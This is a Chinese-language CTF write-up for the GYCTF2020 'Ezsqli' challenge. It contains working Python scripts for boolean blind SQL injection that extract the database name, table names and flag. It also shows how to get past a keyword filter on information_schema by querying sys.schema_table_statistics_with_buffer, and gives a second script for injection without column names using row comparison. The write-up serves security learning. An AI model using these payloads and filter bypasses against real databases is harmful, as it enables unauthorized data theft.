# [GYCTF2020]Ezsqli
![](<./img/Pasted image 20230115083110.png>)

![](<./img/Pasted image 20230115083049.png>)

---

```
id=1
```

```
Nu1L
```

```
id=0
```

```
Error Occured When Fetch Result.
```

```
id=0^1
```

```
Nu1L
```

存在布尔盲注的可能

```python
import requests
import time
import sys

url = "http://xxx.node4.buuoj.cn:81/index.php"

fmt = '(ascii(substr((select(database())),%d,1))>%d)#'
false_re = 'Error'

for i in range(0, 100):
    l = 0
    r = 127
    while l < r:
        mid = (l + r) // 2
        payload = fmt % (i, mid)
        params = {'id': payload}
        response = requests.post(url, params)
        time.sleep(0.1)
        if response.text.find(false_re) >= 0: # mid >= ans
        # if len(response.text) < 100:
            r = mid
        else: # mid < ans
            l = mid + 1
    print(chr(l), end='')
    sys.stdout.flush()

```

```
give_grandpa_pa_pa_pa
```

# 绕过过滤

```
id=information_schema
```

```
SQL Injection Checked.
```

`information_schema`被过滤

```
id=mysql.innodb_table_stats
```

```
SQL Injection Checked.
```

`mysql.innodb_table_stats`也被过滤

参考 [Bypass information_schema](https://cloud.tencent.com/developer/article/1750401)

使用`sys.schema_table_statistics_with_buffer`来绕过

```python
fmt = '(ascii(substr((select(group_concat(table_name))from(sys.schema_table_statistics_with_buffer)where(table_schema)=database()),%d,1))>%d)#'
```

```
users233333333333333,f1ag_1s_h3r3_hhhhh
```

此时可大胆猜测列名为`flag`

```python
fmt = '(ascii(substr((select(flag)from(f1ag_1s_h3r3_hhhhh)),%d,1))>%d)#'
```

```
flag{c65bd808-232c-4510-9cda-a23bc9ea341b}
```

在字段名未知的情况下，也可以进行无字段名注入

```python
import requests
import time
import sys

url = "http://6a664b26-3e33-41a3-afb8-dd1c62b1c403.node4.buuoj.cn:81/index.php"
fmt = '((select 1,"%s") < (select * from f1ag_1s_h3r3_hhhhh))#'
false_re = 'Error'
arg_1 = ''

for i in range(1, 100):
    l = 0
    r = 127
    while l < r:
        mid = (l + r) // 2
        # payload = fmt % (i, mid)
        payload = fmt % (arg_1 + chr(mid))
        # print(payload)
        params = {'id': payload}
        response = requests.post(url, params)
        # print(response.content)
        time.sleep(0.1)
        if response.text.find(false_re) >= 0: # mid >= ans
        # if len(response.text) < 100:
            r = mid
        else: # mid < ans
            l = mid + 1

    if l == 0 or l == 127:
        print('\n#end', end='')
        exit(0)

    print(chr(l - 1), end='')
    arg_1 = arg_1 + chr(l - 1)
    sys.stdout.flush()
```

```
FLAG{D7BDF737-416F-4BC3-94BE-D486B803FCD8|
```

前面因为字符相同时字符串长度越短比较时越小，因此`l`需要`-1`，结尾字符相同时字符串相等，因此`}`被多减了`1`变成了`|`
